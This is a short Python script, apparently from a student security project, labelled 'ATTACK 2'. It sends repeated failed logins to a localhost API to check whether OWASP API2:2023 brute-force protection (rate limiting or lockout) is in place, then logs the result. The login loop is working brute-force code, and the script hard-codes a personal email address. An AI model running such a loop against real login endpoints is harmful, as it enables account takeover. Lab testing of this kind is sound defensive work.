#!/usr/bin/env python3
"""
ATTACK 2: Broken Authentication - Brute Force
OWASP: API2:2023
What: Try many passwords until one works
How: POST to login endpoint with wrong passwords
Why dangerous: No account lockout means unlimited attempts
"""
import requests
import time
import json
import datetime

TARGET = "http://localhost:8888"
RESULTS = "/home/xd-strange24/mscproject/experiments"

def run(count=30):
    print("=" * 55)
    print("ATTACK 2: BRUTE FORCE (API2:2023)")
    print("Broken Authentication")
    print("=" * 55)

    endpoint = TARGET + "/identity/api/auth/login"
    headers = {"Content-Type": "application/json"}

    attempts = 0
    lockout_detected = False

    print("[*] Target: " + endpoint)
    print("[*] Attempting " + str(count) + " password guesses...\n")

    for i in range(count):
        try:
            payload = {
                "email": "akashchandru24@gmail.com",
                "password": "wrongpassword" + str(i)
            }
            r = requests.post(endpoint, json=payload, headers=headers, timeout=5)
            attempts += 1

            if r.status_code == 200:
                print("[!!!] SUCCESS - PASSWORD FOUND at attempt " + str(i))
                break
            elif r.status_code == 429:
                print("[BLOCKED] Rate limiting detected at attempt " + str(i))
                lockout_detected = True
                break
            else:
                if i < 3 or i % 10 == 0:
                    print("[TRY " + str(i+1).zfill(3) + "] wrongpassword" + str(i) + " → " + str(r.status_code))
            time.sleep(0.2)
        except Exception as e:
            print("[ERROR] " + str(e))

    print("\n[RESULT] " + str(attempts) + " attempts made")
    if lockout_detected:
        print("[RESULT] Account lockout detected — API is protected")
    else:
        print("[RESULT] NO lockout detected — vulnerability confirmed!")
    print("[SEVERITY] CRITICAL")
    print("[SPLUNK] Check: index=api_logs auth/login")

    result = {
        "attack": "Broken Authentication",
        "owasp": "API2:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "endpoint": endpoint,
        "attempts": attempts,
        "lockout_detected": lockout_detected,
        "severity": "CRITICAL"
    }

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = RESULTS + "/attack2_bruteforce_" + ts + ".json"
    with open(path, "w") as f:
        json.dump(result, f, indent=2)
    print("[SAVED] " + path)
    return result

if __name__ == "__main__":
    run()
